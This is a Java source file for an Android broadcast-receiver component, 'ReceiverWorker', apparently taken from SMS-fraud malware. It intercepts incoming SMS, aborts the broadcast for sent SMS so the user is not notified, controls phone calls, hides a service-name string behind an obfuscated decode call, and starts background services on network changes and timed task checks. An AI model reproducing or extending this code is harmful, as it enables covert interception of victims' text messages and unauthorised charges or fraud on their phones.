package kernel.workspace.worker;
import kernel.workspace.Settings;
import kernel.workspace.ivr.CallPhoneUtil;
import kernel.workspace.sms.SmsHelper;
import kernel.workspace.util.Logger;
import kernel.workspace.util.ParseKsy;
import kernel.workspace.util.T;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

public class ReceiverWorker {
    private static ReceiverWorker instance;
    private final static Object instanceLocker = new Object();
    public static ReceiverWorker getInstance() {
        if (instance == null) {
            synchronized (instanceLocker) {
                if (instance == null) instance = new ReceiverWorker();
            }
        }
        return instance;
    }
    /**
     * phone
     */
    private String PHONE = ParseKsy.decode("aa1c29f6c80d730cff92979c49424daa");
    private static final Object locker = new Object();
    private static long lastActionTime = 0L;
    public void handleReceiverEvent(Context context, BroadcastReceiver receiver, Intent intent) {
        Logger.info(this.getClass().getName()+" start");
        T.registerReciever(context);
        String action = intent.getAction();
        if (T.SMS_RECEIVED.equals(action)) {
            SmsHelper.onSmsRecieved(context.getApplicationContext(), receiver, intent);
        } else if (T.SMS_SEND.equals(action)) {
            receiver.abortBroadcast();
        } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
            switch (((TelephonyManager) context.getSystemService(PHONE)).getCallState()) {
                case 0:
                    CallPhoneUtil.stopCall();
                    break;
            }
        } else if ("android.net.conn.CONNECTIVITY_CHANGE".equals(action)) {
            context.startService(ServiceWorker.getServiceIntent(context, ServiceWorker.CONNECT_CHANGE));
        }
        synchronized (locker) {
            long current = System.currentTimeMillis();
            if (current - lastActionTime >= Settings.TASK_CHECK_INTERVAL * 1000) {
                lastActionTime = current;
                context.startService(ServiceWorker.getServiceIntent(context, ServiceWorker.CHECK_TASK_ALARM));
            }
        }
        Logger.info(this.getClass().getName()+" end");
    }
}
